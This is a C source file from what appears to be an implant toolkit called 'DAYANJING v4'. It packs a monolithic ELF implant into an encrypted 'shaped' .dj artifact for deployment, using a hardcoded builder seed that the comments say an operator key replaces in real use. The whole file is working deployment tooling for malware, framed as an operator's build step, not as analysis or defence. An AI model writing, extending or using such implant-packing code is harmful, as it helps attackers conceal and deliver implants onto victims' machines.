/* DAYANJING v4 — 25_deploy / src/deploy_pack.c
 *
 * 把单体植入体（ELF）打包成 v4 shaped 制品（.dj）。
 *
 * 设计约束（不是功能，是防线）：
 *  1. 只调用 pk_pack_shaped，不自己发明容器格式 —— 制品格式由 20_packer 独占，
 *     这里若另写一套，两端实现差异会造成"能打包不能解"且无从发现。
 *  2. 种子是建造者持有的常量。真实部署应由操作员密钥派生；此处写死是为了
 *     构建可复现、测试可断言。制品的机密性由 seed 承担，不是由格式承担。
 *  3. bind_id / eph_pub 置零表示"不绑定会话"。绑定是可选能力，不是必填项。
 *     留空不会让制品失效（pk_unpack_shaped 不需要它们）。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "packer.h"

/* 建造者种子：真实部署替换为操作员密钥派生的 32 字节。 */
static const uint8_t DEPLOY_SEED[32] = {
    0x44, 0x41, 0x59, 0x41, 0x4e, 0x4a, 0x49, 0x4e,
    0x47, 0x2d, 0x44, 0x45, 0x50, 0x4c, 0x4f, 0x59,
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
};

static int read_file(const char *path, uint8_t **out, size_t *len)
{
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return -1; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return -1; }
    rewind(f);

    uint8_t *buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return -1; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return -1;
    }
    fclose(f);
    *out = buf;
    *len = (size_t)sz;
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <in-elf> <out-dj>\n", argv[0]);
        return 2;
    }

    uint8_t *raw = NULL;
    size_t raw_len = 0;
    if (read_file(argv[1], &raw, &raw_len) != 0) {
        fprintf(stderr, "read %s failed\n", argv[1]);
        return 1;
    }

    size_t cap = pk_size_bound_v4(raw_len);
    uint8_t *out = malloc(cap);
    if (!out) { free(raw); return 1; }

    uint8_t bind_id[PK_BIND_ID_LEN];
    uint8_t eph_pub[PK_EPH_PUB_LEN];
    memset(bind_id, 0, sizeof(bind_id));
    memset(eph_pub, 0, sizeof(eph_pub));

    size_t olen = cap;
    int rc = pk_pack_shaped(raw, raw_len, DEPLOY_SEED, sizeof(DEPLOY_SEED),
                            bind_id, 1u, eph_pub, out, &olen);
    if (rc != 0) {
        fprintf(stderr, "pk_pack_shaped rc=%d (%s)\n", rc, pk_errstr(rc));
        free(raw); free(out); return 1;
    }

    FILE *f = fopen(argv[2], "wb");
    if (!f) {
        fprintf(stderr, "open %s for write failed\n", argv[2]);
        free(raw); free(out); return 1;
    }
    if (fwrite(out, 1, olen, f) != olen) {
        fclose(f); free(raw); free(out); return 1;
    }
    fclose(f);

    printf("packed: %zu -> %zu bytes -> %s\n", raw_len, olen, argv[2]);
    free(raw);
    free(out);
    return 0;
}
